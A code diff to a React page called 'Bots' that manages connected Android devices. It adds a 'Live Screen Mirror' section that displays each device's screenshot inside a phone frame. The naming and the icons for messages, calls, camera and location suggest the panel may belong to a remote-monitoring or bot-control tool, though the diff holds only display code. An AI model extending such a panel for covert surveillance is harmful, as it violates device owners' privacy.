@@ -4,10 +4,11 @@ import { Card } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Button } from "@/components/ui/button";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
-import { Smartphone, Wifi, Battery, MapPin, MoreVertical, MessageSquare, Phone, Camera, FileText, Monitor, ChevronLeft, Home, Square } from "lucide-react";
+import { Smartphone, Wifi, Battery, MapPin, MoreVertical, MessageSquare, Phone, Camera, FileText, Monitor, ChevronLeft, Home, Square, Image as ImageIcon } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { useToast } from "@/hooks/use-toast";
 import { useRole } from "@/hooks/useRole";
+import { PhoneFrame } from "@/components/PhoneFrame";
 
 const Bots = () => {
   const [devices, setDevices] = useState<any[]>([]);
@@ -131,6 +132,36 @@ const Bots = () => {
             Manage and monitor all connected Android devices
           </p>
         </div>
+
+        {/* Live Screenshots Section */}
+        {(devices.length > 0 ? devices : mockDevices).some(device => device.screenshot_url) && (
+          <Card className="p-6 bg-card border-border mb-8">
+            <div className="mb-4">
+              <h2 className="text-2xl font-semibold text-foreground flex items-center gap-2">
+                <ImageIcon className="w-6 h-6 text-primary" />
+                Live Screen Mirror
+              </h2>
+              <p className="text-muted-foreground text-sm">Real-time device screens</p>
+            </div>
+            <div className="flex flex-wrap gap-8 justify-center">
+              {(devices.length > 0 ? devices : mockDevices).filter(device => device.screenshot_url).map((device) => (
+                <div key={device.id} className="flex flex-col items-center gap-3">
+                  <PhoneFrame 
+                    screenshot={device.screenshot_url} 
+                    platform={device.os?.toLowerCase().includes('ios') ? 'ios' : 'android'}
+                    name={device.name}
+                  />
+                  <div className="text-center">
+                    <p className="font-semibold">{device.name}</p>
+                    <Badge variant="outline" className="mt-1">
+                      {device.os}
+                    </Badge>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </Card>
+        )}
 
         {/* Devices Grid */}
         <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
